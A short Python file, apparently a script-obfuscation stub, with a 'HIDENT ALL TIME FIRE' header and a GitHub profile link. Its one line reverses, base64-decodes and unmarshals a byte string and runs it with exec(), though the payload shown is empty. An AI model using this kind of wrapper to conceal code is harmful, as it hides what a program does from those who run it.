# HIDENT ALL TIME FIRE
# https://www.github.com/sumon-cyber-24
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))